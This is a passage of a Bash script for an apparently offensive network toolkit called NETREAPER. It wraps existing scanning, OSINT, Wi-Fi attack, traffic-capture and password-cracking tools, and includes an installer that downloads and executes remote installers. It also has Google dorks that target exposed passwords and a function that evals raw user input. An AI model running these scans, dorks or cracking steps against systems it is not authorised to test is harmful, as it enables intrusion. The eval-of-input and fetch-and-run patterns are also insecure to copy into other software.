                echo -e "${C_RED}[!] Failed to add latency${C_RESET}"
                return 1
            fi
            ;;
        2)
            read -rp "    Packet loss % [10]: " loss
            loss="${loss:-10}"

            tc qdisc del dev "$IFACE" root 2>/dev/null
            if tc qdisc add dev "$IFACE" root netem loss "${loss}%"; then
                echo -e "${C_GREEN}[✓] Added ${loss}% packet loss to $IFACE${C_RESET}"
            else
                echo -e "${C_RED}[!] Failed to add packet loss${C_RESET}"
                return 1
            fi
            ;;
        3)
            read -rp "    Bandwidth limit (e.g., 1mbit, 100kbit) [1mbit]: " bw
            bw="${bw:-1mbit}"

            tc qdisc del dev "$IFACE" root 2>/dev/null
            if tc qdisc add dev "$IFACE" root tbf rate "$bw" burst 32kbit latency 400ms; then
                echo -e "${C_GREEN}[✓] Limited $IFACE to $bw${C_RESET}"
            else
                echo -e "${C_RED}[!] Failed to add bandwidth limit${C_RESET}"
                return 1
            fi
            ;;
        4)
            read -rp "    Base delay ms [50]: " delay
            delay="${delay:-50}"
            read -rp "    Jitter ms [25]: " jitter
            jitter="${jitter:-25}"

            tc qdisc del dev "$IFACE" root 2>/dev/null
            if tc qdisc add dev "$IFACE" root netem delay "${delay}ms" "${jitter}ms"; then
                echo -e "${C_GREEN}[✓] Added ${delay}ms ±${jitter}ms jitter to $IFACE${C_RESET}"
            else
                echo -e "${C_RED}[!] Failed to add jitter${C_RESET}"
                return 1
            fi
            ;;
        5)
            if tc qdisc del dev "$IFACE" root 2>/dev/null; then
                echo -e "${C_GREEN}[✓] Cleared all rules on $IFACE${C_RESET}"
            else
                echo -e "${C_YELLOW}[!] No rules to clear (or already cleared)${C_RESET}"
            fi
            ;;
        6)
            echo -e "\n${C_CYAN}[*] Current rules on $IFACE:${C_RESET}"
            tc qdisc show dev "$IFACE" 2>/dev/null || echo "    No rules configured"
            ;;
    esac

    # Show current state
    echo -e "\n${C_SHADOW}Current qdisc:${C_RESET}"
    tc qdisc show dev "$IFACE" 2>/dev/null | sed 's/^/    /'

    # Offer connection test
    echo ""
    read -rp "    Test connection? [Y/n]: " test_conn
    if [[ "${test_conn,,}" != "n" ]]; then
        echo -e "\n${C_CYAN}[*] Testing connection (ping 8.8.8.8)...${C_RESET}"
        ping -c 3 8.8.8.8 2>&1 | tail -4 | sed 's/^/    /'
    fi

    press_enter
}

# Alias for compatibility
run_netem() {
    cmd_netem "$@"
}

# Pre-attack target scan for stress testing
stress_prescan() {
    echo -e "\n${C_CYAN}[*] Scanning for targets...${C_RESET}"

    # Get gateway
    local gateway
    gateway=$(ip route | grep default | awk '{print $3}' | head -1)
    echo -e "    Gateway: $gateway"

    # Get local subnet
    local subnet
    subnet=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -1)
    echo -e "    Local subnet: $subnet"

    # Quick ARP scan
    echo -e "\n${C_CYAN}[*] Quick ARP scan...${C_RESET}"
    if command -v arp-scan &>/dev/null; then
        arp-scan -l 2>/dev/null | head -20 | sed 's/^/    /'
    elif command -v nmap &>/dev/null; then
        nmap -sn "$subnet" 2>/dev/null | grep "Nmap scan report" | sed 's/^/    /'
    else
        echo -e "    ${C_YELLOW}Install arp-scan or nmap for scanning${C_RESET}"
    fi

    echo ""
    read -rp "    Enter target from above (or type manually): " target
    echo "$target"
}

#═══════════════════════════════════════════════════════════════════════════════
# TOOL IMPLEMENTATIONS - OSINT
#═══════════════════════════════════════════════════════════════════════════════

run_theharvester() {
    check_tool "theHarvester" || check_tool "theharvester" || return 1
    operation_header "theHarvester" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_info "theHarvester on $TARGET"
    echo
    log_command_preview "theHarvester -d ${TARGET} -b all"
    theHarvester -d "$TARGET" -b all 2>/dev/null || theharvester -d "$TARGET" -b all
    operation_summary "theHarvester" "$start_ms" "${LOG_DIR}/osint.log"
}

run_reconng() {
    check_tool "recon-ng" || return 1
    operation_header "Recon-ng" "$TARGET"
    local start_ms
    start_ms=$(start_timer_ms)
    log_info "Launching Recon-ng"
    log_command_preview "recon-ng"
    recon-ng
    operation_summary "Recon-ng" "$start_ms" "${LOG_DIR}/osint.log"
}

run_shodan() {
    if ! command -v shodan &>/dev/null; then
        log_warning "Shodan CLI not found"
        echo -e "    ${C_SHADOW}Install: pip3 install shodan && shodan init <API_KEY>${C_RESET}"
        return 1
    fi
    operation_header "Shodan" "$TARGET"
    local start_ms
    start_ms=$(start_timer_ms)
    log_info "Shodan search for $TARGET"
    echo
    log_command_preview "shodan host ${TARGET}"
    shodan host "$TARGET"
    operation_summary "Shodan" "$start_ms" "${LOG_DIR}/osint.log"
}

run_whois() {
    check_tool "whois" || return 1
    local target="${TARGET:-$1}"

    # Check if it looks like an IP
    if is_valid_ip "$target"; then
        # Check if private
        if is_private_ip "$target"; then
            echo -e "${C_YELLOW}[!] $target is a private IP address${C_RESET}"
            echo -e "${C_SHADOW}    WHOIS only works with public IPs or domains${C_RESET}"
            echo ""
            echo -e "    ${C_CYAN}Suggestions:${C_RESET}"
            echo -e "    • Use a public IP (e.g., 8.8.8.8)"
            echo -e "    • Use a domain name (e.g., google.com)"
            echo -e "    • For local network info, try: arp -a"
            echo ""
            read -rp "    Continue anyway? [y/N]: " cont
            if [[ "${cont,,}" != "y" ]]; then
                return 1
            fi
        fi
    fi

    operation_header "WHOIS" "$target"
    local start_ms
    start_ms=$(start_timer_ms)
    log_info "WHOIS lookup for $target"
    echo

    echo -e "${C_CYAN}[*] Running WHOIS lookup for $target...${C_RESET}"
    echo ""

    log_command_preview "whois ${target}"
    if whois "$target" 2>&1; then
        echo -e "\n${C_GREEN}[✓] WHOIS complete${C_RESET}"
    else
        echo -e "\n${C_RED}[!] WHOIS failed${C_RESET}"
        echo -e "${C_SHADOW}    Check network connection or try a different target${C_RESET}"
    fi

    operation_summary "WHOIS" "$start_ms" "${LOG_DIR}/osint.log"
}

cmd_google_dork() {
    echo -ne "    ${C_GHOST}Domain: ${C_RESET}"
    read -r domain
    
    echo
    echo -e "    ${C_SKULL}Common Google Dorks for ${C_VENOM}$domain${C_RESET}:"
    echo
    echo -e "    ${C_GHOST}site:$domain filetype:pdf${C_RESET}"
    echo -e "    ${C_GHOST}site:$domain filetype:xls${C_RESET}"
    echo -e "    ${C_GHOST}site:$domain inurl:admin${C_RESET}"
    echo -e "    ${C_GHOST}site:$domain inurl:login${C_RESET}"
    echo -e "    ${C_GHOST}site:$domain intitle:\"index of\"${C_RESET}"
    echo -e "    ${C_GHOST}site:$domain ext:sql | ext:db | ext:log${C_RESET}"
    echo -e "    ${C_GHOST}site:$domain intext:password${C_RESET}"
    echo -e "    ${C_GHOST}\"$domain\" inurl:pastebin${C_RESET}"
    echo
    echo -e "    ${C_SHADOW}Copy and search in your browser${C_RESET}"
}

#═══════════════════════════════════════════════════════════════════════════════
# TOOL IMPLEMENTATIONS - UTILITIES
#═══════════════════════════════════════════════════════════════════════════════

cmd_traffic_capture() {
    get_interface || return 1
    operation_header "Traffic capture" "$IFACE"
    
    echo
    echo -e "    ${C_GHOST}[1]${C_RESET} tcpdump (CLI)"
    echo -e "    ${C_GHOST}[2]${C_RESET} Wireshark (GUI)"
    echo -e "    ${C_GHOST}[3]${C_RESET} tshark (CLI + analysis)"
    echo
    echo -ne "    ${C_FIRE}▶ ${C_RESET}"
    read -r choice
    
    local outfile
    outfile="${OUTPUT_DIR}/capture_$(date +%Y%m%d_%H%M%S).pcap"
    
    case "$choice" in
        1)
            check_tool "tcpdump" || return 1
            require_root || return 1
            local start_ms
            start_ms=$(start_timer_ms)
            log_info "Starting tcpdump on $IFACE (Ctrl+C to stop)"
            echo -e "    ${C_SHADOW}Output: $outfile${C_RESET}"
            log_command_preview "tcpdump -i ${IFACE} -w ${outfile}"
            tcpdump -i "$IFACE" -w "$outfile"
            operation_summary "tcpdump" "$start_ms" "$outfile"
            ;;
        2)
            check_tool "wireshark" || return 1
            local start_ms
            start_ms=$(start_timer_ms)
            log_info "Launching Wireshark on $IFACE"
            log_command_preview "wireshark -i ${IFACE} -k"
            wireshark -i "$IFACE" -k &
            operation_summary "Wireshark" "$start_ms" "$outfile"
            ;;
        3)
            check_tool "tshark" || return 1
            require_root || return 1
            local start_ms
            start_ms=$(start_timer_ms)
            log_info "Starting tshark on $IFACE (Ctrl+C to stop)"
            log_command_preview "tshark -i ${IFACE} -w ${outfile}"
            tshark -i "$IFACE" -w "$outfile"
            operation_summary "tshark" "$start_ms" "$outfile"
            ;;
    esac
}

cmd_install_arsenal() {
    require_root || return 1
    
    echo -e "\n    ${C_FIRE}╔═══════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "    ${C_FIRE}║              NETREAPER ARSENAL INSTALLER                  ║${C_RESET}"
    echo -e "    ${C_FIRE}╚═══════════════════════════════════════════════════════════╝${C_RESET}\n"
    
    log_info "This will install 70+ security tools (~2-5GB)"
    log_info "Estimated time: 10-30 minutes depending on connection"
    echo
    echo -ne "    ${C_GHOST}Continue with full installation? [y/N]: ${C_RESET}"
    read -r confirm
    [[ "${confirm,,}" != "y" ]] && { log_info "Installation cancelled"; return 0; }
    
    echo
    log_info "Updating package lists..."
    apt update
    
    # ═══════════════════════════════════════════════════════════════════
    # SCANNING TOOLS
    # ═══════════════════════════════════════════════════════════════════
    log_info "Installing scanning tools..."
    apt install -y nmap masscan unicornscan netdiscover arp-scan fping \
        hping3 p0f arping nbtscan 2>/dev/null || true
    
    # Rustscan (from GitHub releases)
    if ! command -v rustscan &>/dev/null; then
        log_info "Installing rustscan..."
        local rustscan_deb="/tmp/rustscan.deb"
        wget -q "https://github.com/RustScan/RustScan/releases/download/2.1.1/rustscan_2.1.1_amd64.deb" -O "$rustscan_deb" 2>/dev/null
        dpkg -i "$rustscan_deb" 2>/dev/null || apt install -f -y 2>/dev/null
        rm -f "$rustscan_deb"
    fi
    
    # Zmap
    apt install -y zmap 2>/dev/null || true
    
    # ═══════════════════════════════════════════════════════════════════
    # DNS TOOLS
    # ═══════════════════════════════════════════════════════════════════
    log_info "Installing DNS tools..."
    apt install -y dnsenum dnsmap dnsrecon fierce 2>/dev/null || true
    
    # ═══════════════════════════════════════════════════════════════════
    # SSL TOOLS
    # ═══════════════════════════════════════════════════════════════════
    log_info "Installing SSL tools..."
    apt install -y sslscan sslyze 2>/dev/null || true
    
    # testssl.sh
    if [[ ! -f /usr/local/bin/testssl.sh ]]; then
        log_info "Installing testssl.sh..."
        git clone --depth 1 https://github.com/drwetter/testssl.sh.git /opt/testssl.sh 2>/dev/null
        ln -sf /opt/testssl.sh/testssl.sh /usr/local/bin/testssl.sh 2>/dev/null
    fi
    
    # ═══════════════════════════════════════════════════════════════════
    # WIFI TOOLS
    # ═══════════════════════════════════════════════════════════════════
    log_info "Installing WiFi tools..."
    apt install -y aircrack-ng reaver bully pixiewps cowpatty mdk3 mdk4 \
        hostapd dnsmasq macchanger iw wireless-tools 2>/dev/null || true
    
    # Wifite2
    if ! command -v wifite &>/dev/null; then
        log_info "Installing wifite..."
        apt install -y wifite 2>/dev/null || {
            git clone https://github.com/derv82/wifite2.git /opt/wifite2 2>/dev/null
            ln -sf /opt/wifite2/Wifite.py /usr/local/bin/wifite 2>/dev/null
        }
    fi
    
    # Bettercap
    if ! command -v bettercap &>/dev/null; then
        log_info "Installing bettercap..."
        apt install -y bettercap 2>/dev/null || {
            apt install -y libpcap-dev libnetfilter-queue-dev 2>/dev/null
            go install github.com/bettercap/bettercap@latest 2>/dev/null
        }
    fi
    
    # Fluxion
    if [[ ! -d /opt/fluxion ]]; then
        log_info "Installing fluxion..."
        git clone https://github.com/FluxionNetwork/fluxion.git /opt/fluxion 2>/dev/null
        ln -sf /opt/fluxion/fluxion.sh /usr/local/bin/fluxion 2>/dev/null
    fi
    
    # Wifiphisher
    if ! command -v wifiphisher &>/dev/null; then
        log_info "Installing wifiphisher..."
        apt install -y wifiphisher 2>/dev/null || pip3 install wifiphisher 2>/dev/null
    fi
    
    # ═══════════════════════════════════════════════════════════════════
    # WEB TOOLS
    # ═══════════════════════════════════════════════════════════════════
    log_info "Installing web tools..."
    apt install -y nikto dirb gobuster sqlmap 2>/dev/null || true
    
    # WPScan
    if ! command -v wpscan &>/dev/null; then
        log_info "Installing wpscan..."
        apt install -y wpscan 2>/dev/null || gem install wpscan 2>/dev/null
    fi
    
    # ffuf
    if ! command -v ffuf &>/dev/null; then
        log_info "Installing ffuf..."
        apt install -y ffuf 2>/dev/null || go install github.com/ffuf/ffuf/v2@latest 2>/dev/null
    fi
    
    # Nuclei
    if ! command -v nuclei &>/dev/null; then
        log_info "Installing nuclei..."
        go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest 2>/dev/null || {
            wget -q "https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_$(uname -s)_$(uname -m).zip" -O /tmp/nuclei.zip
            unzip -o /tmp/nuclei.zip -d /usr/local/bin/ 2>/dev/null
            rm -f /tmp/nuclei.zip
        }
    fi
    
    # httpx
    if ! command -v httpx &>/dev/null; then
        log_info "Installing httpx..."
        go install github.com/projectdiscovery/httpx/cmd/httpx@latest 2>/dev/null
    fi
    
    # Subfinder
    if ! command -v subfinder &>/dev/null; then
        log_info "Installing subfinder..."
        go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest 2>/dev/null
    fi
    
    # Amass
    if ! command -v amass &>/dev/null; then
        log_info "Installing amass..."
        apt install -y amass 2>/dev/null || go install github.com/owasp-amass/amass/v4/...@latest 2>/dev/null
    fi
    
    # ═══════════════════════════════════════════════════════════════════
    # EXPLOIT TOOLS
    # ═══════════════════════════════════════════════════════════════════
    log_info "Installing exploit tools..."
    
    # Metasploit
    if ! command -v msfconsole &>/dev/null; then
        log_info "Installing metasploit-framework (this takes a while)..."
        apt install -y metasploit-framework 2>/dev/null || {
            curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
            chmod +x /tmp/msfinstall
            /tmp/msfinstall
        }
    fi
    
    # Searchsploit
    if ! command -v searchsploit &>/dev/null; then
        log_info "Installing exploitdb..."
        apt install -y exploitdb 2>/dev/null || {
            git clone https://gitlab.com/exploit-database/exploitdb.git /opt/exploitdb 2>/dev/null
            ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit 2>/dev/null
        }
    fi
    
    # CrackMapExec
    if ! command -v crackmapexec &>/dev/null; then
        log_info "Installing crackmapexec..."
        apt install -y crackmapexec 2>/dev/null || pipx install crackmapexec 2>/dev/null
    fi
    
    # ═══════════════════════════════════════════════════════════════════
    # TRAFFIC TOOLS
    # ═══════════════════════════════════════════════════════════════════
    log_info "Installing traffic tools..."
    apt install -y tcpdump wireshark tshark ettercap-text-only 2>/dev/null || true
    
    # ═══════════════════════════════════════════════════════════════════
    # OSINT TOOLS
    # ═══════════════════════════════════════════════════════════════════
    log_info "Installing OSINT tools..."
    apt install -y theharvester recon-ng 2>/dev/null || true
    pip3 install shodan 2>/dev/null || true
    
    # ═══════════════════════════════════════════════════════════════════
    # CREDENTIAL TOOLS
    # ═══════════════════════════════════════════════════════════════════
    log_info "Installing credential tools..."
    apt install -y hashcat john hydra medusa 2>/dev/null || true
    
    # ═══════════════════════════════════════════════════════════════════
    # POST-EXPLOITATION
    # ═══════════════════════════════════════════════════════════════════
    log_info "Installing post-exploitation tools..."
    apt install -y impacket-scripts python3-impacket 2>/dev/null || pip3 install impacket 2>/dev/null
    
    # ═══════════════════════════════════════════════════════════════════
    # WORDLISTS
    # ═══════════════════════════════════════════════════════════════════
    log_info "Installing wordlists..."
    apt install -y wordlists seclists 2>/dev/null || true
    
    # Unpack rockyou if needed
    if [[ -f /usr/share/wordlists/rockyou.txt.gz ]]; then
        log_info "Extracting rockyou.txt..."
        gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
    fi
    
    # ═══════════════════════════════════════════════════════════════════
    # DEPENDENCIES
    # ═══════════════════════════════════════════════════════════════════
    log_info "Installing dependencies..."
    apt install -y git curl wget python3 python3-pip golang-go ruby \
        build-essential libssl-dev libffi-dev python3-dev 2>/dev/null || true
    
    # Ensure go binaries are in PATH
    if [[ -d "$HOME/go/bin" ]]; then
        export PATH="$PATH:$HOME/go/bin"
        # shellcheck disable=SC2016
        grep -q 'go/bin' ~/.bashrc || echo 'export PATH="$PATH:$HOME/go/bin"' >> ~/.bashrc
    fi
    
    # ═══════════════════════════════════════════════════════════════════
    # FINAL STATUS
    # ═══════════════════════════════════════════════════════════════════
    echo
    log_success "Installation complete!"
    echo
    cmd_tool_status
    
    echo
    log_info "Some tools may require additional setup:"
    echo -e "    ${C_SHADOW}• Metasploit: Run 'msfdb init' to initialize database${C_RESET}"
    echo -e "    ${C_SHADOW}• Hashcat: May need GPU drivers for full performance${C_RESET}"
    echo -e "    ${C_SHADOW}• Shodan: Run 'shodan init <API_KEY>' to configure${C_RESET}"
    echo -e "    ${C_SHADOW}• WPScan: Run 'wpscan --update' to get latest data${C_RESET}"
}

cmd_install_quick() {
    require_root || return 1
    
    log_info "Quick install - essential tools only..."
    apt update
    apt install -y nmap masscan aircrack-ng hashcat john hydra \
        nikto gobuster sqlmap tcpdump wireshark wordlists 2>/dev/null
    
    # Unpack rockyou
    [[ -f /usr/share/wordlists/rockyou.txt.gz ]] && gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
    
    log_success "Quick install complete!"
    cmd_tool_status
}

cmd_status_header() {
    echo
    echo -e "    ${C_CYAN}╔═══════════════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "    ${C_CYAN}║${C_RESET}                      ${C_FIRE}☠ ARSENAL STATUS ☠${C_RESET}                           ${C_CYAN}║${C_RESET}"
    echo -e "    ${C_CYAN}╚═══════════════════════════════════════════════════════════════════════╝${C_RESET}"
    echo
}

cmd_status_full() {
    reset_status_cache
    clear
    cmd_status_header

    local installed=0
    local missing=0
    local total=0

    for category in "${ARSENAL_CATEGORIES[@]}"; do
        local color="${CAT_COLORS[$category]:-$C_SHADOW}"
        local icon="${CAT_ICONS[$category]:-}"
        local tools
        tools=$(category_tools "$category")

        echo -e "    ${color}${icon} ${category}:${C_RESET}"
        echo -n "    "

        local col=0
        for tool in $tools; do
            ((total++))
            if tool_status_cached "$tool"; then
                echo -ne "${C_GREEN}✓${C_RESET}${tool}  "
                ((installed++))
            else
                echo -ne "${C_RED}✗${C_RESET}${tool}  "
                ((missing++))
            fi

            ((col++))
            if ((col >= 6)); then
                echo
                echo -n "    "
                col=0
            fi
        done
        echo
        echo
    done

    local pct=0
    ((total > 0)) && pct=$((installed * 100 / total))
    local bar_width=40
    local filled=$((pct * bar_width / 100))
    local empty=$((bar_width - filled))

    echo -e "    ${C_BORDER}───────────────────────────────────────────────────────────────────────${C_RESET}"
    echo
    echo -ne "    ${C_SHADOW}Progress: ${C_RESET}["
    echo -ne "${C_GREEN}"
    for ((i=0; i<filled; i++)); do echo -n "█"; done
    echo -ne "${C_RED}"
    for ((i=0; i<empty; i++)); do echo -n "░"; done
    echo -e "${C_RESET}] ${pct}%"
    echo
    echo -e "    ${C_GREEN}● Installed: ${installed}${C_RESET}    ${C_RED}● Missing: ${missing}${C_RESET}    ${C_SHADOW}● Total: ${total}${C_RESET}"
    echo

    if ((missing > 0)); then
        echo -e "    ${C_SHADOW}Run ${C_CYAN}sudo netreaper-install${C_RESET}${C_SHADOW} to install missing tools${C_RESET}"
        echo
    fi
}

cmd_status_compact() {
    reset_status_cache

    echo
    echo -e "    ${C_FIRE}☠ ARSENAL STATUS${C_RESET}"
    echo

    local installed=0
    local missing=0
    local quick_tools=(nmap masscan aircrack-ng hashcat john hydra nikto sqlmap metasploit-framework)

    for tool in "${quick_tools[@]}"; do
        if tool_status_cached "$tool"; then
            ((installed++))
        else
            ((missing++))
        fi
    done

    echo -e "    ${C_GREEN}✓ Installed:${C_RESET} $installed"
    echo -e "    ${C_RED}✗ Missing:${C_RESET} $missing"
    echo
}

cmd_status_category() {
    reset_status_cache
    local cat_raw="${1:-}"
    local cat="${cat_raw^^}"

    if [[ -z "$cat" ]]; then
        log_error "Category required"
        echo "    Available: ${ARSENAL_CATEGORIES[*]}"
        return 1
    fi

    if ! category_exists "$cat"; then
        log_error "Unknown category: $cat"
        echo "    Available: ${ARSENAL_CATEGORIES[*]}"
        return 1
    fi

    echo
    echo -e "    ${CAT_COLORS[$cat]}${cat} Tools:${C_RESET}"
    echo

    for tool in $(category_tools "$cat"); do
        if tool_status_cached "$tool"; then
            echo -e "    ${C_GREEN}✓${C_RESET} $tool"
        else
            echo -e "    ${C_RED}✗${C_RESET} $tool"
        fi
    done
    echo
}

cmd_status_json() {
    reset_status_cache

    local installed=0
    local missing=0
    local total=0

    echo "{"
    echo "  \"version\": \"$VERSION\","
    echo "  \"categories\": {"

    local idx=0
    local total_cats=${#ARSENAL_CATEGORIES[@]}
    for category in "${ARSENAL_CATEGORIES[@]}"; do
        ((idx++))
        printf '    "%s": [' "${category,,}"

        local first_tool=true
        for tool in $(category_tools "$category"); do
            ((total++))
            local status="missing"
            if tool_status_cached "$tool"; then
                status="installed"
                ((installed++))
            else
                ((missing++))
            fi

            if [[ "$first_tool" == true ]]; then
                first_tool=false
            else
                printf ', '
            fi
            printf '{"name": "%s", "status": "%s"}' "$tool" "$status"
        done

        if (( idx < total_cats )); then
            echo "],"
        else
            echo "]"
        fi
    done

    echo "  },"
    echo "  \"summary\": {"
    echo "    \"installed\": $installed,"
    echo "    \"missing\": $missing,"
    echo "    \"total\": $total"
    echo "  }"
    echo "}"
}

cmd_tool_status() {
    cmd_status_full
}

cmd_view_logs() {
    if [[ ! -d "$LOG_DIR" ]] || [[ -z "$(ls -A "$LOG_DIR" 2>/dev/null)" ]]; then
        log_warning "No logs found"
        return
    fi
    
    echo
    echo -e "    ${C_SKULL}Recent logs:${C_RESET}"
    echo
    # shellcheck disable=SC2012
    ls -lt "$LOG_DIR"/*.log 2>/dev/null | head -10
    echo
    echo -ne "    ${C_GHOST}View file (or Enter to skip): ${C_RESET}"
    read -r logfile
    
    [[ -n "$logfile" ]] && [[ -f "$logfile" ]] && less "$logfile"
}

cmd_generate_report() {
    local report
    report="${OUTPUT_DIR}/report_$(date +%Y%m%d_%H%M%S).md"
    
    {
        echo "# NETREAPER Engagement Report"
        echo "Generated: $(date)"
        echo "Operator: $(whoami)@$(hostname)"
        echo
        echo "## Session Files"
        echo
        ls -la "$OUTPUT_DIR" 2>/dev/null
        echo
        echo "## Log Summary"
        echo
        wc -l "$LOG_DIR"/*.log 2>/dev/null
        echo
        echo "---"
        echo "NETREAPER v${VERSION}"
    } > "$report"
    
    log_loot "Report saved: $report"
}

cmd_run_direct() {
    echo -ne "    ${C_GHOST}Command: ${C_RESET}"
    read -r cmd
    [[ -z "$cmd" ]] && return
    operation_header "Direct command" "manual"
    local start_ms
    start_ms=$(start_timer_ms)
    log_info "Executing: $cmd"
    echo
    eval "$cmd"
    operation_summary "Direct command" "$start_ms" "${LOG_DIR}/netreaper.log"
}

show_help_main() {
    echo
    echo -e "    ${C_FIRE}☠ NETREAPER v${VERSION}${C_RESET} - Network Security Toolkit"
    echo
    echo -e "    ${C_CYAN}USAGE:${C_RESET}"
    echo -e "        netreaper [options] <command> [arguments]"
    echo
    echo -e "    ${C_CYAN}OPTIONS:${C_RESET}"
    echo -e "        -v, --verbose      Enable verbose output"
    echo -e "        -q, --quiet        Suppress non-error output"
    echo -e "        --no-color         Disable colored output"
    echo -e "        --debug            Enable debug mode"
    echo -e "        --dry-run          Show commands without executing (safe preview mode)"
    echo -e "        --version          Show version"
    echo -e "        -h, --help         Show this help"
    echo
    echo -e "    ${C_CYAN}COMMANDS:${C_RESET}"
    echo -e "        ${C_GREEN}menu${C_RESET}              Launch interactive menu (default)"
    echo -e "        ${C_GREEN}wizard${C_RESET} [type]     Guided wizard (scan/wifi)"
    echo -e "        ${C_GREEN}scan${C_RESET} <target>     Scan a target"
    echo -e "        ${C_GREEN}discover${C_RESET} [subnet] Discover hosts"
    echo -e "        ${C_GREEN}wifi${C_RESET}              WiFi actions"
    echo -e "        ${C_GREEN}status${C_RESET}            Tool status (--compact|--json|--category)"
    echo -e "        ${C_GREEN}install${C_RESET}           Launch installer"
    echo -e "        ${C_GREEN}config${C_RESET}            Config management"
    echo -e "        ${C_GREEN}session${C_RESET}           Session management"
    echo -e "        ${C_GREEN}update${C_RESET}            Check for updates"
    echo -e "        ${C_GREEN}logs${C_RESET}              View logs"
    echo -e "        ${C_GREEN}help${C_RESET} [topic]      Show help"
    echo
    echo -e "    ${C_CYAN}EXAMPLES:${C_RESET}"
    echo -e "        netreaper                           # Interactive menu"
    echo -e "        netreaper scan 10.0.0.0/24 --full   # Full subnet scan"
    echo -e "        netreaper wizard scan               # Guided scan wizard"
    echo -e "        netreaper wifi --monitor wlan0      # Enable monitor mode"
    echo -e "        netreaper status --json             # JSON status output"
    echo
    echo -e "    ${C_SHADOW}Config: $CONFIG_DIR${C_RESET}"
    echo -e "    ${C_SHADOW}Logs:   $LOG_DIR${C_RESET}"
    echo -e "    ${C_SHADOW}Output: $OUTPUT_DIR${C_RESET}"
    echo
}

show_help_scan() {
    echo
    echo -e "    ${C_CYAN}Scan Help${C_RESET}"
    echo -e "    netreaper scan <target> [--quick|--full|--stealth|--vuln|--udp]"
    echo -e "    netreaper wizard scan    # guided flow"
    echo
}

show_help_wifi() {
    echo
    echo -e "    ${C_CYAN}WiFi Help${C_RESET}"
    echo -e "    netreaper wifi --monitor <iface>"
    echo -e "    netreaper wifi --managed <iface>"
    echo -e "    netreaper wifi --scan <iface>"
    echo -e "    netreaper wizard wifi    # guided flow"
    echo
}

show_help() {
    local topic="${1:-main}"
    case "$topic" in
        scan) show_help_scan ;;
        wifi) show_help_wifi ;;
        config) config_show ;;
        *) show_help_main ;;
    esac
}

show_version() {
    echo "$SCRIPT_NAME v$VERSION ($CODENAME)"
}

#═══════════════════════════════════════════════════════════════════════════════
# CLI INTERFACE
#═══════════════════════════════════════════════════════════════════════════════

cli_scan() {
    TARGET="$1"
    shift
    local scan_type="quick" profile_name=""

    while [[ $# -gt 0 ]]; do
        case "$1" in
            --full)    scan_type="full" ;;
            --stealth) scan_type="stealth" ;;
            --vuln)    scan_type="vuln" ;;
            --udp)     scan_type="udp" ;;
            --profile) shift; profile_name="$1" ;;
            *)         TARGET="$1" ;;
        esac
        shift
    done

    [[ -z "$TARGET" ]] && { show_usage; exit 1; }
    TARGET="$(resolve_target_alias "$TARGET")"
    validate_target "$TARGET" || exit 1
    record_history "$TARGET"

    if [[ -n "$profile_name" ]]; then
        local p_args
        p_args=$(profile_load "$profile_name") || { log_error "Profile not found"; exit 1; }
        for opt in $p_args; do
            case "$opt" in
                --full|full) scan_type="full" ;;
                --stealth|stealth) scan_type="stealth" ;;
                --vuln|vuln) scan_type="vuln" ;;
                --udp|udp) scan_type="udp" ;;
                *) ;; 
            esac
        done
    fi
    OUTPUT_FILE="${OUTPUT_DIR}/${TARGET//[^a-zA-Z0-9._-]/_}_$(date +%Y%m%d_%H%M%S)"
    
    case "$scan_type" in
        quick)   run_nmap_quick ;;
        full)    run_nmap_full ;;
        stealth) run_nmap_stealth ;;
        vuln)    run_nmap_vuln ;;
        udp)     run_nmap_udp ;;
    esac
}

cli_wifi() {
    local action="${1:-}" iface="${2:-}"

    case "$action" in
        --monitor)
            [[ -z "$iface" ]] && { log_error "Interface required"; exit 1; }
            require_root || exit 1
            IFACE="$iface"

            # Validate wireless interface
            if ! validate_wireless_interface "$IFACE" false; then
                exit 1
            fi

            operation_header "WiFi monitor (CLI)" "$IFACE"
            local start_ms
            start_ms=$(start_timer_ms)
            if check_tool "airmon-ng" 2>/dev/null; then
                enable_monitor_mode "$IFACE"
            else
                log_command_preview "ip link set ${IFACE} down && iw dev ${IFACE} set type monitor"
                ip link set "$IFACE" down
                iw dev "$IFACE" set type monitor 2>/dev/null || iwconfig "$IFACE" mode monitor
                ip link set "$IFACE" up
                check_monitor_mode "$IFACE"
            fi
            operation_summary "Monitor mode enabled" "$start_ms" "${LOG_DIR}/netreaper.log"
            ;;
        --managed)
            [[ -z "$iface" ]] && { log_error "Interface required"; exit 1; }
            require_root || exit 1
            IFACE="$iface"

            # Validate wireless interface
            if ! validate_wireless_interface "$IFACE" false; then
                exit 1
            fi

            operation_header "WiFi managed (CLI)" "$IFACE"
            local start_ms
            start_ms=$(start_timer_ms)
            if check_tool "airmon-ng" 2>/dev/null; then
                disable_monitor_mode "$IFACE"
            else
                log_command_preview "ip link set ${IFACE} down && iw dev ${IFACE} set type managed"
                ip link set "$IFACE" down
                iw dev "$IFACE" set type managed 2>/dev/null || iwconfig "$IFACE" mode managed
                ip link set "$IFACE" up
            fi
            operation_summary "Managed mode enabled" "$start_ms" "${LOG_DIR}/netreaper.log"
            ;;
        --scan)
            require_root || exit 1
            check_tool "airodump-ng" || exit 1
            IFACE="${iface:-wlan0}"

            # Validate wireless interface and require monitor mode
            if ! validate_wireless_interface "$IFACE" true; then
                exit 1
            fi

            operation_header "WiFi scan (CLI)" "$IFACE"
            local start_ms
            start_ms=$(start_timer_ms)
            log_command_preview "airodump-ng ${IFACE}"
            airodump-ng "$IFACE"
            operation_summary "WiFi scan" "$start_ms" "${LOG_DIR}/wifi_scan.log"
            ;;
        *)
            echo "Usage: $SCRIPT_NAME wifi [--monitor|--managed|--scan] <interface>"
            ;;
    esac
}

cli_crack() {
    local mode="hashcat" capfile="" wordlist="${DEFAULT_WORDLIST}" ssid="" rules=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --aircrack) mode="aircrack" ;;
            --john) mode="john" ;;
            --cowpatty) mode="cowpatty" ;;
